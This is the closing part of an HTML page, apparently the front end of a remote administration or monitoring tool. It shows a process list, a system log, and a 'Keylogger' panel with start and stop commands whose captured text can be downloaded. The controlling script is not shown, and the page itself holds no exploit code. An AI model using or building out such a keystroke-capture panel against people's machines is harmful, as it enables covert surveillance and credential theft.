                  </button>
                </div>
              </div>
              <div style="max-height: 500px; overflow-y: auto">
                <table class="table table-hover table-custom" id="procTable">
                  <thead>
                    <tr>
                      <th>ID</th>
                      <th>Name / Title</th>
                      <th>Memory</th>
                      <th>Action</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td colspan="4" class="text-center text-secondary">
                        Auto-refreshing... waiting for data.
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          </section>

          <section id="tab-terminal" class="tab-content">
            <div class="row h-100 g-3">
              <div class="col-md-3">
                <div class="card-custom h-100 d-flex flex-column">
                  <div class="card-header-custom small-header">
                    <span><i class="fas fa-history"></i> System Log</span>
                  </div>
                  <div
                    id="terminal-output"
                    class="terminal-window flex-grow-1 system-log-font"
                  >
                    > Ready...
                  </div>
                </div>
              </div>

              <div class="col-md-4">
                <div class="card-custom h-100 d-flex flex-column">
                  <div class="card-header-custom small-header">
                    <span class="text-danger"
                      ><i class="fas fa-keyboard"></i> Keylogger</span
                    >
                    <div>
                      <button
                        onclick="sendCommand('START_KEYLOG')"
                        class="btn btn-success btn-sm me-1"
                        title="Start Log"
                        style="padding: 2px 8px"
                      >
                        <i class="fas fa-play"></i>
                      </button>
                      <button
                        onclick="sendCommand('STOP_KEYLOG')"
                        class="btn btn-sm me-1 keylog-stop-btn"
                        title="Stop Log"
                        style="padding: 2px 8px"
                      >
                        <i class="fas fa-stop"></i>
                      </button>
                      <button
                        onclick="clearAllKeylogs()"
                        class="btn btn-sm btn-light border"
                        title="Clear All"
                      >
                        Clear
                      </button>
                    </div>
                  </div>
                  <div
                    id="raw-key-output"
                    class="terminal-window flex-grow-1 raw-log-area"
                  ></div>
                </div>
              </div>

              <div class="col-md-5">
                <div class="card-custom h-100 d-flex flex-column">
                  <div
                    class="card-header-custom small-header d-flex justify-content-between align-items-center"
                  >
                    <span class="text-success"
                      ><i class="fas fa-file-word"></i> Document View</span
                    >
                    <button
                      onclick="downloadLog()"
                      class="btn btn-sm btn-success text-white fw-bold"
                    >
                      <i class="fas fa-download"></i> Download .txt
                    </button>
                  </div>
                  <div class="paper-container flex-grow-1">
                    <textarea
                      id="keylogger-editor"
                      class="paper-textarea"
                      readonly
                      placeholder="Waiting for text..."
                    ></textarea>
                  </div>
                </div>
              </div>
            </div>
          </section>
        </div>
      </main>
    </div>

    <div id="toast-container" class="toast-container"></div>

    <div id="app-library-modal" class="modal-overlay hidden">
      <div class="modal-content-custom">
        <div class="d-flex justify-content-between align-items-center mb-3">
          <h4 class="fw-bold m-0">
            <i class="fas fa-rocket text-primary"></i> App Library
          </h4>
          <button onclick="closeAppLibrary()" class="btn btn-close"></button>
        </div>

        <div class="input-group mb-3">
          <span class="input-group-text"><i class="fas fa-search"></i></span>
          <input
            type="text"
            id="appSearch"
            class="form-control"
            placeholder="Search apps..."
            onkeyup="filterApps()"
          />
        </div>

        <div id="app-grid" class="app-grid-container">
          <div class="text-center p-4 text-secondary">
            <i class="fas fa-spinner fa-spin me-2"></i> Loading list...
          </div>
        </div>
      </div>
    </div>

    <script type="module" src="js/main.js"></script>
  </body>
</html>
